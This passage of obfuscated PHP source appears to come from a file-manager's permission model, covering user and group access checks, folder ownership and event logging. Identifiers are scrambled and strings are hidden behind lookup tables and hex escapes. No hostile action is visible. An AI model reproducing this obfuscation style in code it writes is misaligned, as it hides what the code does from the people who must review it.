get($ÃäÑÃµ) { $ÂÇİÑªä = $this->getSourceList(array($ÃäÑÃµ), !0); return $ÂÇİÑªä[0]; } public function getSourceList($ˆªÛŠ±¹, $ÙÅŞÂÁÉ = false, $Ü§°å™Â = false) { $‰üÌœ =& $_SERVER[óÔë„ú]; if (!$ˆªÛŠ±¹) { return array(); } $„ÓÑÍŠÇ = Model($‰üÌœ[1405]); if (!$ÙÅŞÂÁÉ && count($ˆªÛŠ±¹) == 1) { $ÙÅŞÂÁÉ = array(); $ÙÅŞÂÁÉ[$ˆªÛŠ±¹[0]] = $„ÓÑÍŠÇ->sourceInfo($ˆªÛŠ±¹[0]); } if (!$ÙÅŞÂÁÉ) { $¨ïíÇ¦ = array($‰üÌœ[491] => array($‰üÌœ[492], $ˆªÛŠ±¹)); $ÙÅŞÂÁÉ = $„ÓÑÍŠÇ->field($‰üÌœ[2149])->where($¨ïíÇ¦)->select(); $ÙÅŞÂÁÉ = array_to_keyvalue($ÙÅŞÂÁÉ, $‰üÌœ[193]); } $·„ßå¯„ = $ˆªÛŠ±¹; foreach ($ÙÅŞÂÁÉ as $±Î•à¨ => $ï—Ø÷è”) { $õŒŒïÚŸ = $„ÓÑÍŠÇ->parentLevelArray($ï—Ø÷è”[$‰üÌœ[584]]); $·„ßå¯„ = array_merge($·„ßå¯„, array($±Î•à¨), array_reverse($õŒŒïÚŸ)); } $·„ßå¯„ = array_values(array_unique($·„ßå¯„)); if (!$·„ßå¯„) { return array(); } $ú°‡ÒÃ÷ = $this->sourceAuthSelect($·„ßå¯„); $–•¶¼ö = array(); foreach ($·„ßå¯„ as $–½®’¿™) { if (isset($ú°‡ÒÃ÷[$–½®’¿™])) { $–•¶¼ö[$–½®’¿™] = $ú°‡ÒÃ÷[$–½®’¿™]; } } $‘Şäó­ = $this->userIsRoot($Ü§°å™Â); $ùÎ‡Ì±® = AuthModel::authAll(); $€°§²Š¼ = array($‰üÌœ[488] => $ùÎ‡Ì±®, $‰üÌœ[2150] => array($‰üÌœ[493] => 0, $‰üÌœ[1963] => $ùÎ‡Ì±®, $‰üÌœ[494] => LNG($‰üÌœ[2151]), $‰üÌœ[1980] => $‰üÌœ[2152])); $“ºÅİ¤Ö = array(); foreach ($ÙÅŞÂÁÉ as $–½®’¿™ => $¸óÔØúÆ) { if ($‘Şäó­ && $GLOBALS[$‰üÌœ[6]][$‰üÌœ[1976]]) { $“ºÅİ¤Ö[$–½®’¿™] = $€°§²Š¼; continue; } $“ºÅİ¤Ö[$–½®’¿™] = $this->makeSourceAuth($¸óÔØúÆ, $–•¶¼ö, $Ü§°å™Â); } return $“ºÅİ¤Ö; } public function authDeepCheck($ß²ÓÆ è, $“èÉã…Î = false) { $¹§İ¿¢± =& $_SERVER[óÔë„ú]; $“èÉã…Î = $“èÉã…Î ? $“èÉã…Î : USER_ID; $Î…Ÿ¼ì› = $this->makeAuthDeep($“èÉã…Î); if (!in_array($ß²ÓÆ è, $Î…Ÿ¼ì›[$¹§İ¿¢±[2153]])) { return !1; } $Ç•Ù•Ï¶ = array(); foreach ($Î…Ÿ¼ì›[$¹§İ¿¢±[2154]] as $ÛÂäªşÉ => $³ÃĞºöè) { if (!in_array($ß²ÓÆ è, $³ÃĞºöè)) { continue; } $Ç•Ù•Ï¶[] = $ÛÂäªşÉ; } if (!$Ç•Ù•Ï¶) { return !1; } $Ì³Ãö†» = $Ç•Ù•Ï¶ ? $Ç•Ù•Ï¶[0] : $ß²ÓÆ è; return array($¹§İ¿¢±[488] => -1, $¹§İ¿¢±[540] => array($¹§İ¿¢±[493] => $¹§İ¿¢±[1260], $¹§İ¿¢±[1963] => $¹§İ¿¢±[228], $¹§İ¿¢±[494] => LNG($¹§İ¿¢±[2155]), $¹§İ¿¢±[1980] => $¹§İ¿¢±[2156]), $¹§İ¿¢±[2157] => LNG($¹§İ¿¢±[2158]), $¹§İ¿¢±[2159] => $this->sourceAuthInfo($Ì³Ãö†»)); } protected function makeAuthDeep($­Õ³·º = false) { $›êàÊş• =& $_SERVER[óÔë„ú]; static $äà…¿¦ = array(); $­Õ³·º = $­Õ³·º ? $­Õ³·º : USER_ID; if (isset($äà…¿¦[$­Õ³·º])) { return $äà…¿¦[$­Õ³·º]; } $èŸ¾’ƒ = Model($›êàÊş•[2160])->listData(); $Ñ¤ÓÉÎÌ = array(); foreach ($èŸ¾’ƒ as $­öµş¾¬) { if ($­öµş¾¬[$›êàÊş•[487]] == 0 && $­öµş¾¬[$›êàÊş•[1979]] == $›êàÊş•[91]) { $Ñ¤ÓÉÎÌ[] = $­öµş¾¬[$›êàÊş•[475]]; } } $¶²ï“«Û = $this->userGroupParents($­Õ³·º); $ğ¾ññä· = array($›êàÊş•[190] => SourceModel::TYPE_USER, $›êàÊş•[569] => $­Õ³·º); if ($¶²ï“«Û) { $ğ¾ññä· = array(array($›êàÊş•[190] => SourceModel::TYPE_USER, $›êàÊş•[569] => $­Õ³·º), array($›êàÊş•[190] => SourceModel::TYPE_GROUP, $›êàÊş•[569] => array($›êàÊş•[492], $¶²ï“«Û)), $›êàÊş•[1063] => $›êàÊş•[2059]); } $ ¢²‹½« = $this->field($›êàÊş•[2161])->where($ğ¾ññä·)->select(); $È©¸åØÜ = array(); $¦ÌÜÛù  = array_to_keyvalue_group($ ¢²‹½«, $›êàÊş•[193]); foreach ($¦ÌÜÛù  as $ê¨œîíÅ => $ÎâÉˆÖª) { $Ú›Âà† = $this->authArrayCheck($ÎâÉˆÖª, $­Õ³·º); if ($Ú›Âà†[$›êàÊş•[488]] > 0) { $È©¸åØÜ[] = $ê¨œîíÅ . $›êàÊş•[12]; } } if ($¶²ï“«Û) { $…º‘ŒÅô = Model($›êàÊş•[585]); foreach ($¶²ï“«Û as $¼ŸÙë¿×) { $¸óÊÚ£î = $…º‘ŒÅô->getInfo($¼ŸÙë¿×); if (!$¸óÊÚ£î || !is_array($¸óÊÚ£î[$›êàÊş•[90]])) { continue; } $È©¸åØÜ[] = $¸óÊÚ£î[$›êàÊş•[90]][$›êàÊş•[193]]; } } $ø…›ï‡ï = array(); $Ô‚½ú¯ = $¶²ï“«Û; $ƒ»éÉˆ— = Model($›êàÊş•[1405]); $…º‘ŒÅô = Model($›êàÊş•[585]); $°Ó‚œÀğ = array(); $ùº¸ºò = array(); $—ŸÌ•İã = array(); $ğÏáÉ…  = array(); if ($È©¸åØÜ) { $îçÒ×Ø’ = $ƒ»éÉˆ—->where(array($›êàÊş•[193] => array($›êàÊş•[492], $È©¸åØÜ)))->select(); foreach ($îçÒ×Ø’ as $¼Ñ¶Íıù) { $«ı—Íß = $ƒ»éÉˆ—->parentLevelArray($¼Ñ¶Íıù[$›êàÊş•[584]]); $ø…›ï‡ï = array_merge($ø…›ï‡ï, $«ı—Íß); $Ô‚½ú¯[] = $¼Ñ¶Íıù[$›êàÊş•[569]]; $°Ó‚œÀğ[$¼Ñ¶Íıù[$›êàÊş•[193]]] = $«ı—Íß; $ùº¸ºò[$¼Ñ¶Íıù[$›êàÊş•[193]]] = $¼Ñ¶Íıù[$›êàÊş•[569]]; } } $Ô‚½ú¯ = array_values(array_unique($Ô‚½ú¯)); $³¡Â¹‰‹ = $Ô‚½ú¯; foreach ($³¡Â¹‰‹ as $¼ŸÙë¿×) { $¸óÊÚ£î = $…º‘ŒÅô->getInfo($¼ŸÙë¿×); $«ı—Íß = $ƒ»éÉˆ—->parentLevelArray($¸óÊÚ£î[$›êàÊş•[584]]); $Ô‚½ú¯ = array_merge($Ô‚½ú¯, $«ı—Íß); } $Ô‚½ú¯ = array_values(array_unique($Ô‚½ú¯)); foreach ($Ô‚½ú¯ as $¼ŸÙë¿×) { $¸óÊÚ£î = $…º‘ŒÅô->getInfo($¼ŸÙë¿×); $ø…›ï‡ï[] = $¸óÊÚ£î[$›êàÊş•[90]][$›êàÊş•[193]]; $—ŸÌ•İã[$¼ŸÙë¿×] = $¸óÊÚ£î[$›êàÊş•[90]][$›êàÊş•[193]]; $ğÏáÉ… [$¼ŸÙë¿×] = $ƒ»éÉˆ—->parentLevelArray($¸óÊÚ£î[$›êàÊş•[584]]); } foreach ($°Ó‚œÀğ as $İÂ—·Â² => $¡³²Úş±) { $è¡™ì = $ùº¸ºò[$İÂ—·Â²]; if (!$è¡™ì || !$—ŸÌ•İã[$è¡™ì]) { continue; } $¢ÄÈüÆ¦ = array(); foreach ($ğÏáÉ… [$è¡™ì] as $¼ŸÙë¿×) { $¢ÄÈüÆ¦[] = $—ŸÌ•İã[$¼ŸÙë¿×]; } $°Ó‚œÀğ[$İÂ—·Â²] = array_merge($¢ÄÈüÆ¦, $¡³²Úş±); } $ø…›ï‡ï = array_values(array_unique($ø…›ï‡ï)); $Â¿¦úïÊ = array($›êàÊş•[2153] => $ø…›ï‡ï, $›êàÊş•[2154] => $°Ó‚œÀğ); $äà…¿¦[$­Õ³·º] = $Â¿¦úïÊ; return $Â¿¦úïÊ; } private function makeSourceAuth($’ØçÑ”ø, $óâª§Ó™, $ÏÍ¿ù½ö = false) { $úÇÈîùî =& $_SERVER[óÔë„ú]; $íğ³õ­ë = $úÇÈîùî[91]; $‘Õ»•á = $’ØçÑ”ø[$úÇÈîùî[569]]; $»‡•½úÀ = $’ØçÑ”ø[$úÇÈîùî[190]] == SourceModel::TYPE_GROUP; $âÊİşÂß = $»‡•½úÀ ? $this->groupRootAuth($‘Õ»•á, $ÏÍ¿ù½ö) : !1; if ($âÊİşÂß && Model($úÇÈîùî[571])->authCheckAction($âÊİşÂß[$úÇÈîùî[487]], $úÇÈîùî[1978])) { return $this->groupAuthInfo($âÊİşÂß, $‘Õ»•á); } $ëô¤Õ­ó = Model($úÇÈîùî[1405])->parentLevelArray($’ØçÑ”ø[$úÇÈîùî[584]]); $ëô¤Õ­ó = array_merge(array($’ØçÑ”ø[$úÇÈîùî[193]]), array_reverse($ëô¤Õ­ó)); $Ÿ¥´¾Û = !1; foreach ($ëô¤Õ­ó as $÷ŠÀêÌª) { if (!isset($óâª§Ó™[$÷ŠÀêÌª])) { continue; } $Èú²›€Ø = $this->authMake($óâª§Ó™[$÷ŠÀêÌª], $ÏÍ¿ù½ö); if ($Èú²›€Ø[$úÇÈîùî[540]]) { $Ÿ¥´¾Û = $Èú²›€Ø; break; } } if (!$»‡•½úÀ) { return $Ÿ¥´¾Û; } if (!$Ÿ¥´¾Û && $âÊİşÂß) { $Ÿ¥´¾Û = $this->groupAuthInfo($âÊİşÂß, $‘Õ»•á); } if (!$Ÿ¥´¾Û) { $îğÒ—á = Model($úÇÈîùî[585])->getInfo($‘Õ»•á); $Ó“¼ ‚ = explode($úÇÈîùî[50], trim($îğÒ—á[$úÇÈîùî[584]], $úÇÈîùî[50])); $Ó“¼ ‚ = array_reverse($Ó“¼ ‚); foreach ($Ó“¼ ‚ as $ÇˆÏ Ëè) { if ($ÇˆÏ Ëè == $úÇÈîùî[228] || $ÇˆÏ Ëè == $íğ³õ­ë) { continue; } $Æòô±‹• = $this->groupRootAuth($ÇˆÏ Ëè, $ÏÍ¿ù½ö); if (!$Æòô±‹•) { continue; } $Ÿ¥´¾Û = $this->groupAuthInfo($Æòô±‹•, $ÇˆÏ Ëè); break; } } if (!$Ÿ¥´¾Û || $Ÿ¥´¾Û[$úÇÈîùî[488]] <= 0) { $ş”—üÖÀ = $this->authDeepCheck($’ØçÑ”ø[$úÇÈîùî[193]], $ÏÍ¿ù½ö); if ($ş”—üÖÀ) { $Ÿ¥´¾Û = $ş”—üÖÀ; } } return $Ÿ¥´¾Û; } private function userIsRoot($ªîĞÍÙ‡ = false) { $Ä‚×½ë• =& $_SERVER[óÔë„ú]; if (!$ªîĞÍÙ‡ && KodUser::isRoot()) { return !0; } $¨ó­ß±ç = Model($Ä‚×½ë•[598])->getInfo($ªîĞÍÙ‡); $Æ×ù„Š‡ = Model($Ä‚×½ë•[2162])->listData($¨ó­ß±ç[$Ä‚×½ë•[2163]]); if ($Æ×ù„Š‡ && $Æ×ù„Š‡[$Ä‚×½ë•[575]][$Ä‚×½ë•[2164]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¹¶ú©à) { $Ï™·–ù• =& $_SERVER[óÔë„ú]; $Š…³¾ªÔ = Model($Ï™·–ù•[1405]); $›şÃ¸‘ = $Š…³¾ªÔ->sourceInfo($¹¶ú©à); if (!$›şÃ¸‘) { return !1; } $Š…³¾ªÔ->groupPathDisplay($›şÃ¸‘); $¡Í÷ÔòÛ = array($›şÃ¸‘); $¡Í÷ÔòÛ = $Š…³¾ªÔ->_listAppendPath($¡Í÷ÔòÛ); $›şÃ¸‘ = $¡Í÷ÔòÛ[0]; $à¿Ë•Í² = $›şÃ¸‘[$Ï™·–ù•[582]]; if (isset($›şÃ¸‘[$Ï™·–ù•[590]])) { $Œı±­ƒò = explode($Ï™·–ù•[8], trim($›şÃ¸‘[$Ï™·–ù•[582]], $Ï™·–ù•[8])); array_shift($Œı±­ƒò); $à¿Ë•Í² = $›şÃ¸‘[$Ï™·–ù•[588]] . $Ï™·–ù•[2165] . implode($Ï™·–ù•[8], $Œı±­ƒò); } return array($Ï™·–ù•[494] => $›şÃ¸‘[$Ï™·–ù•[32]], $Ï™·–ù•[87] => KodIO::make($›şÃ¸‘[$Ï™·–ù•[193]]), $Ï™·–ù•[2166] => $à¿Ë•Í²); } private function groupAuthInfo($õ®ˆøÏĞ, $ó¾€æ) { $‚ÛÆ¯¨½ =& $_SERVER[óÔë„ú]; $×·ŸÎ• = Model($‚ÛÆ¯¨½[585])->getInfo($ó¾€æ); return array($‚ÛÆ¯¨½[2167] => intval($õ®ˆøÏĞ[$‚ÛÆ¯¨½[487]]), $‚ÛÆ¯¨½[2150] => $õ®ˆøÏĞ, $‚ÛÆ¯¨½[2168] => LNG($‚ÛÆ¯¨½[2169]), $‚ÛÆ¯¨½[2159] => array($‚ÛÆ¯¨½[494] => $×·ŸÎ•[$‚ÛÆ¯¨½[32]], $‚ÛÆ¯¨½[87] => KodIO::make($×·ŸÎ•[$‚ÛÆ¯¨½[90]][$‚ÛÆ¯¨½[193]]), $‚ÛÆ¯¨½[2166] => $×·ŸÎ•[$‚ÛÆ¯¨½[589]])); } protected function groupRootAuth($äãæêÂÃ, $’ôü×µò = false) { $€ô©–¾œ =& $_SERVER[óÔë„ú]; $’ôü×µò = $’ôü×µò ? $’ôü×µò : USER_ID; $íØ •› = $’ôü×µò . $€ô©–¾œ[2170] . $äãæêÂÃ; static $ÍÈ†Äô = array(); if (isset($ÍÈ†Äô[$íØ •›])) { return $ÍÈ†Äô[$íØ •›]; } $àã½Äüµ = Model($€ô©–¾œ[585])->getInfo($äãæêÂÃ); $§ÑÖùëÉ = $this->userGroupList($’ôü×µò); $Îâõ¡Ÿ¾ = isset($§ÑÖùëÉ[$äãæêÂÃ]) ? $§ÑÖùëÉ[$äãæêÂÃ][$€ô©–¾œ[487]] : !1; if ($Îâõ¡Ÿ¾ && Model($€ô©–¾œ[571])->authCheckAction($Îâõ¡Ÿ¾[$€ô©–¾œ[487]], $€ô©–¾œ[1978])) { $ÍÈ†Äô[$íØ •›] = $Îâõ¡Ÿ¾; return $Îâõ¡Ÿ¾; } $êŞ×Òãº = $this->sourceAuthSelect($àã½Äüµ[$€ô©–¾œ[90]][$€ô©–¾œ[193]]); $Î·Ö×óº = $êŞ×Òãº ? $this->authMake($êŞ×Òãº, $’ôü×µò) : !1; $ğş¤ßµã = $Î·Ö×óº ? $Î·Ö×óº[$€ô©–¾œ[540]] : !1; $ÍÈ†Äô[$íØ •›] = $ğş¤ßµã ? $ğş¤ßµã : $Îâõ¡Ÿ¾; return $ÍÈ†Äô[$íØ •›]; } public function authOwnerApply($¼“–ÑÚ—) { $ªËáûí¦ =& $_SERVER[óÔë„ú]; if (empty($¼“–ÑÚ—[$ªËáûí¦[487]]) || isset($¼“–ÑÚ—[$ªËáûí¦[2171]]) && $¼“–ÑÚ—[$ªËáûí¦[2171]]) { return $¼“–ÑÚ—; } if (AuthModel::authCheckRoot($¼“–ÑÚ—[$ªËáûí¦[487]][$ªËáûí¦[488]])) { return $¼“–ÑÚ—; } $é”¢›üğ = Model($ªËáûí¦[1405])->parentLevelArray($¼“–ÑÚ—[$ªËáûí¦[584]]); $é”¢›üğ = array_merge(array($¼“–ÑÚ—[$ªËáûí¦[193]]), array_reverse($é”¢›üğ)); $ö¼¢Âä÷ = $this->sourceAuthSelect($é”¢›üğ); $£Õš§‚ = array(); $™ ğ¨¯‘ = array(); foreach ($ö¼¢Âä÷ as $£ãÓÎûĞ => $™–§³Ÿà) { $ä£¥­¼ = $this->authFolderOwnerUser($™–§³Ÿà); $£Õš§‚[$£ãÓÎûĞ] = $ä£¥­¼; $™ ğ¨¯‘ = array_merge($™ ğ¨¯‘, $ä£¥­¼[$ªËáûí¦[662]]); if ($ä£¥­¼[$ªËáûí¦[2172]]) { break; } } if (count($™ ğ¨¯‘) == 0) { $™ ğ¨¯‘ = $this->authFolderOwnerGroup($¼“–ÑÚ—[$ªËáûí¦[569]]); } $™ ğ¨¯‘ = array_unique($™ ğ¨¯‘); if (AuthModel::authCheckRoot($¼“–ÑÚ—[$ªËáûí¦[487]][$ªËáûí¦[488]])) { $™ ğ¨¯‘[] = USER_ID; } $¼“–ÑÚ—[$ªËáûí¦[487]][$ªËáûí¦[2173]] = Model($ªËáûí¦[577])->userListInfo($™ ğ¨¯‘); return $¼“–ÑÚ—; } private function authFolderOwnerGroup($İ„²Ÿ¼) { $«àÏÊÍ  =& $_SERVER[óÔë„ú]; $‘‹ÆØ¬É = Model($«àÏÊÍ [2051])->where(array($«àÏÊÍ [1957] => $İ„²Ÿ¼))->select(); $¤€¦ Ó = array(); if (!$‘‹ÆØ¬É) { return $¤€¦ Ó; } foreach ($‘‹ÆØ¬É as $–™² «‰) { $™š†±öÜ = $this->authInfo($–™² «‰); if (AuthModel::authCheckRoot($™š†±öÜ[$«àÏÊÍ [487]])) { $¤€¦ Ó[] = $–™² «‰[$«àÏÊÍ [1758]]; } } return $¤€¦ Ó; } private function authFolderOwnerUser($¸ˆúíÁ) { $ûìòŸíá =& $_SERVER[óÔë„ú]; $‰Œ©Èó€ = array(); $óù¡ãÖ× = !1; foreach ($¸ˆúíÁ as $ÜùË•¹–) { $ƒƒ·°Öú = $this->authInfo($ÜùË•¹–); if ($ÜùË•¹–[$ûìòŸíá[569]] == $ûìòŸíá[228]) { $óù¡ãÖ× = !0; } if ($ÜùË•¹–[$ûìòŸíá[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ƒƒ·°Öú[$ûìòŸíá[487]])) { $‰Œ©Èó€[] = $ÜùË•¹–[$ûìòŸíá[569]]; } } } return array($ûìòŸíá[662] => $‰Œ©Èó€, $ûìòŸíá[2172] => $óù¡ãÖ×); } public function authMake($§è¯Æò‹, $÷¸íéËŸ = false) { $‚ç–‡Áâ =& $_SERVER[óÔë„ú]; $Ïæ‡¨ÃÂ = $this->authArrayCheck($§è¯Æò‹, $÷¸íéËŸ); if ($Ïæ‡¨ÃÂ[$‚ç–‡Áâ[2174]]) { $Ïæ‡¨ÃÂ[$‚ç–‡Áâ[2174]] = $this->sourceAuthInfo($Ïæ‡¨ÃÂ[$‚ç–‡Áâ[2174]]); } return $Ïæ‡¨ÃÂ; } public function authArrayCheck($±ŠòõÇµ, $í¯¡Óµ = false) { $¹ÜÔ†Ç =& $_SERVER[óÔë„ú]; if (!$±ŠòõÇµ) { return array($¹ÜÔ†Ç[488] => 0, $¹ÜÔ†Ç[540] => !1); } $í¯¡Óµ = $í¯¡Óµ ? $í¯¡Óµ : USER_ID; $ƒ¶•’¹İ = 0; $Šƒ÷ïŸÀ = 0; $úô‰è¾ò = 0; $¨ú»¿¿ì = 0; $´Ÿ”Áºœ = 0; $¨Ì‘÷Ö¶ = 0; $ë–¦£¡ô = 1000; $È¼µù½ = 0; $å³éİ‘÷ = 0; $Ä¡ÕÊµ = 0; $®Èßæº¬ = 0; $Â¥‰¯²Ü = array($¹ÜÔ†Ç[193] => 0); foreach ($±ŠòõÇµ as $Â¥‰¯²Ü) { $±ï¹®¸ = $this->authInfo($Â¥‰¯²Ü); if (!$±ï¹®¸) { continue; } $è¿¹Ì®Ò = $Â¥‰¯²Ü[$¹ÜÔ†Ç[569]]; $ä•Û‚¸Ò = intval($±ï¹®¸[$¹ÜÔ†Ç[487]]); if ($Â¥‰¯²Ü[$¹ÜÔ†Ç[190]] == SourceModel::TYPE_USER && $è¿¹Ì®Ò == $í¯¡Óµ) { $ƒ¶•’¹İ = !0; $úô‰è¾ò = $±ï¹®¸; $Šƒ÷ïŸÀ = $ä•Û‚¸Ò; } else { if ($Â¥‰¯²Ü[$¹ÜÔ†Ç[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($è¿¹Ì®Ò, $í¯¡Óµ)) { $¨ú»¿¿ì = !0; $Üëò™­ = $this->groupStepToUserGroup($è¿¹Ì®Ò, $í¯¡Óµ); if ($Üëò™­ < $ë–¦£¡ô) { $ë–¦£¡ô = $Üëò™­; $´Ÿ”Áºœ = $ä•Û‚¸Ò; $¨Ì‘÷Ö¶ = $±ï¹®¸; $È¼µù½ = $è¿¹Ì®Ò; } if ($Üëò™­ == $ë–¦£¡ô && $ä•Û‚¸Ò >= $´Ÿ”Áºœ) { $´Ÿ”Áºœ = $ä•Û‚¸Ò; $¨Ì‘÷Ö¶ = $±ï¹®¸; $È¼µù½ = $è¿¹Ì®Ò; } } else { if ($è¿¹Ì®Ò == $¹ÜÔ†Ç[228]) { $å³éİ‘÷ = !0; $®Èßæº¬ = $±ï¹®¸; $Ä¡ÕÊµ = $ä•Û‚¸Ò; } } } } if ($ƒ¶•’¹İ) { $ĞñĞ¶Øé = $Šƒ÷ïŸÀ; $±ï¹®¸ = $úô‰è¾ò; $Ğ¥³ú Â = LNG($¹ÜÔ†Ç[2175]); } else { if ($¨ú»¿¿ì) { $ĞñĞ¶Øé = $´Ÿ”Áºœ; $±ï¹®¸ = $¨Ì‘÷Ö¶; $¥ÌÌæïí = Model($¹ÜÔ†Ç[585])->getInfo($È¼µù½); $Ğ¥³ú Â = $¹ÜÔ†Ç[176] . $¥ÌÌæïí[$¹ÜÔ†Ç[589]] . $¹ÜÔ†Ç[2176] . LNG($¹ÜÔ†Ç[2177]); } else { if ($å³éİ‘÷) { $ĞñĞ¶Øé = $Ä¡ÕÊµ; $±ï¹®¸ = $®Èßæº¬; $Ğ¥³ú Â = LNG($¹ÜÔ†Ç[2147]); } else { $ĞñĞ¶Øé = 0; $±ï¹®¸ = !1; $Ğ¥³ú Â = $¹ÜÔ†Ç[12]; } } } $É•œëÈ = array($¹ÜÔ†Ç[2167] => intval($ĞñĞ¶Øé), $¹ÜÔ†Ç[2150] => $±ï¹®¸, $¹ÜÔ†Ç[2168] => $Ğ¥³ú Â, $¹ÜÔ†Ç[2159] => $Â¥‰¯²Ü[$¹ÜÔ†Ç[193]]); return $É•œëÈ; } private function groupContainUser($Ïûâªò, $’âúŒ = false) { return in_array($Ïûâªò, $this->userGroupParents($’âúŒ)); } private function groupStepToUserGroup($–˜ëŠæş, $³™‰íªï = false) { $•Üˆş¾ñ =& $_SERVER[óÔë„ú]; $¿Ÿ¹ÓÖ¼ = $this->userGroupList($³™‰íªï); $ìÖÀÇÛ‚ = 1000; $Š€ò€±Ñ = $GLOBALS[$•Üˆş¾ñ[6]][$•Üˆş¾ñ[92]][$•Üˆş¾ñ[2064]] == 1; $—¨ô»¸Í = $Š€ò€±Ñ ? 3 : 2; foreach ($¿Ÿ¹ÓÖ¼ as $ÉˆöğşÈ) { if ($ÉˆöğşÈ[$•Üˆş¾ñ[1957]] == $–˜ëŠæş) { return 0; } $ëÙ½­Ïş = explode($•Üˆş¾ñ[50], trim($ÉˆöğşÈ[$•Üˆş¾ñ[584]], $•Üˆş¾ñ[50])); if ($ëÙ½­Ïş[0] == $•Üˆş¾ñ[228] && count($ëÙ½­Ïş) > $—¨ô»¸Í) { $êÎ›µüÓ = array_reverse(array_slice($ëÙ½­Ïş, $—¨ô»¸Í)); $ØÍØÏæ£ = array_search($–˜ëŠæş, $êÎ›µüÓ); if ($ØÍØÏæ£ !== !1 && $ØÍØÏæ£ + 1 <= $ìÖÀÇÛ‚) { $ìÖÀÇÛ‚ = $ØÍØÏæ£ + 1; } } } return $ìÖÀÇÛ‚; } private function userGroupList($÷ôİ˜İº = false) { $‚êÓéÓÔ =& $_SERVER[óÔë„ú]; static $Ç½±õÕğ = array(); if (isset($Ç½±õÕğ[$÷ôİ˜İº])) { return $Ç½±õÕğ[$÷ôİ˜İº]; } $¼ªÔÄõ¶ = Model($‚êÓéÓÔ[598])->getInfo($÷ôİ˜İº); $Ç½±õÕğ[$÷ôİ˜İº] = array_to_keyvalue($¼ªÔÄõ¶[$‚êÓéÓÔ[2148]], $‚êÓéÓÔ[1957]); return $Ç½±õÕğ[$÷ôİ˜İº]; } public function userGroupParents($Í–İÉ) { $„ñ—â¦Æ =& $_SERVER[óÔë„ú]; static $ÂÑü˜ºµ = array(); $Í–İÉ = $Í–İÉ ? $Í–İÉ : USER_ID; if (isset($ÂÑü˜ºµ[$Í–İÉ])) { return $ÂÑü˜ºµ[$Í–İÉ]; } $á÷À±¶è = $this->userGroupList($Í–İÉ); $ñ¾šó¤¹ = array(); $µ’’ù = $GLOBALS[$„ñ—â¦Æ[6]][$„ñ—â¦Æ[92]][$„ñ—â¦Æ[2064]] == 1; $üâ°¦ƒŞ = $µ’’ù ? 3 : 2; foreach ($á÷À±¶è as $Ã‰Œı÷÷) { $œ«‡ö‘ = array($Ã‰Œı÷÷[$„ñ—â¦Æ[1957]]); $ÚÁÇ³ = explode($„ñ—â¦Æ[50], trim($Ã‰Œı÷÷[$„ñ—â¦Æ[584]], $„ñ—â¦Æ[50])); if ($ÚÁÇ³[0] == $„ñ—â¦Æ[228] && count($ÚÁÇ³) > $üâ°¦ƒŞ) { $Ê•ê¹äå = array_slice($ÚÁÇ³, $üâ°¦ƒŞ); $œ«‡ö‘ = array_merge($œ«‡ö‘, array_reverse($Ê•ê¹äå)); } $ñ¾šó¤¹ = array_merge($ñ¾šó¤¹, $œ«‡ö‘); } $ÂÑü˜ºµ[$Í–İÉ] = array_unique($ñ¾šó¤¹); return $ÂÑü˜ºµ[$Í–İÉ]; } public function authTargetInfoMake($—¥­ß±¡) { $³Í¿Åôé =& $_SERVER[óÔë„ú]; $å—Øæ»¤ = array(); $¨íÜş¢À = array(); foreach ($—¥­ß±¡ as $±©ö¶á) { if ($±©ö¶á[$³Í¿Åôé[190]] == SourceModel::TYPE_USER) { $å—Øæ»¤[] = intval($±©ö¶á[$³Í¿Åôé[569]]); } else { if ($±©ö¶á[$³Í¿Åôé[190]] == SourceModel::TYPE_GROUP) { $¨íÜş¢À[] = intval($±©ö¶á[$³Í¿Åôé[569]]); } } } if ($å—Øæ»¤) { $å—Øæ»¤ = Model($³Í¿Åôé[577])->userListInfo($å—Øæ»¤); } if ($¨íÜş¢À) { $şñÖ¹Ñ‡ = array($³Í¿Åôé[2049] => array($³Í¿Åôé[492], $¨íÜş¢À)); $¨íÜş¢À = Model($³Í¿Åôé[585])->field($³Í¿Åôé[2178])->where($şñÖ¹Ñ‡)->select(); $¨íÜş¢À = array_to_keyvalue($¨íÜş¢À, $³Í¿Åôé[1957]); } return array($³Í¿Åôé[2179] => $å—Øæ»¤, $³Í¿Åôé[2180] => $¨íÜş¢À); } public function authInfo($õŞæ¸“ğ) { $¢‰‹Ùñü =& $_SERVER[óÔë„ú]; if ($õŞæ¸“ğ[$¢‰‹Ùñü[2065]]) { $şâÀşÆ· = Model($¢‰‹Ùñü[571])->listData($õŞæ¸“ğ[$¢‰‹Ùñü[2065]]); if (!$şâÀşÆ·) { return !1; $¬õ ì›ó = Model($¢‰‹Ùñü[571])->listData(); $»¨Õª£ = array_filter_by_field($¬õ ì›ó, $¢‰‹Ùñü[487], $¢‰‹Ùñü[228]); return $»¨Õª£; } $´áıèìğ = array_field_key($şâÀşÆ·, array($¢‰‹Ùñü[475], $¢‰‹Ùñü[32], $¢‰‹Ùñü[487], $¢‰‹Ùñü[1980], $¢‰‹Ùñü[1981])); $´áıèìğ[$¢‰‹Ùñü[2181]] = $õŞæ¸“ğ; return $´áıèìğ; } else { return array($¢‰‹Ùñü[493] => 0, $¢‰‹Ùñü[1963] => $õŞæ¸“ğ[$¢‰‹Ùñü[2125]], $¢‰‹Ùñü[494] => $¢‰‹Ùñü[12], $¢‰‹Ùñü[1980] => $¢‰‹Ùñü[2182]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\x65\x5f\145\166\145\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\151\155\145", "\164\x69\155\x65", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x64\145\x73\143", '', "\151\x6e\x73\x65\162\164\54\165\160\x64\141\164\x65\x2c\163\145\154\145\143\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ŞÂã¯†, $¦òé†…, $µÒ¤µœÊ = '') { $‰Œ¿äáí =& $_SERVER[óÔë„ú]; if (!$this->eventSave) { return; } $êš‰Øğî = Model($‰Œ¿äáí[1405])->sourceInfo($ŞÂã¯†); if (!$êš‰Øğî) { return !1; } if ($this->isDisableEvent($êš‰Øğî, $¦òé†…)) { return; } if ($µÒ¤µœÊ && is_string($µÒ¤µœÊ)) { $µÒ¤µœÊ = array($‰Œ¿äáí[1996] => $µÒ¤µœÊ); } $Ó¯÷Æ¼Ô = defined($‰Œ¿äáí[2183]) ? USER_ID 